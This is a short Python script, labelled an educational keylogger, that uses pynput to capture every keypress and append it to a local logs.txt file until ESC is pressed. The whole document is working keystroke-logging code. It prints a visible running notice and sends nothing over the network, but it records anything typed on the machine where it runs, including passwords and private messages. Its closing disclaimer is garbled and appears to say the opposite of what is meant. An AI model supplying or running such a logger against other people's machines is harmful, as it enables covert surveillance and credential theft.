from pynput.keyboard import Listener, Key

# Function to write keys into file
def write_to_file(key):

    letter = str(key)

    # Remove single quotes
    letter = letter.replace("'", "")

    # Handle special keys
    if letter == "Key.space":
        letter = " "

    elif letter == "Key.enter":
        letter = "\n"

    elif letter == "Key.backspace":
        letter = " [BACKSPACE] "

    elif letter == "Key.shift":
        letter = ""

    elif letter == "Key.shift_r":
        letter = ""

    elif letter == "Key.ctrl_l":
        letter = ""

    elif letter == "Key.ctrl_r":
        letter = ""

    elif letter == "Key.tab":
        letter = " [TAB] "

    elif letter == "Key.esc":

        print("\nKeylogger Stopped!")

        return False

    # Save keys into log file
    with open("logs.txt", "a") as file:

        file.write(letter)


# Main Heading

print(" EDUCATIONAL KEYLOGGER TOOL ")


print("\nKeylogger is running...")
print("Press ESC to stop.\n")


# Start Listener
with Listener(on_press=write_to_file) as l:

    l.join()


# Used only for educational purposes and not for ethical considerations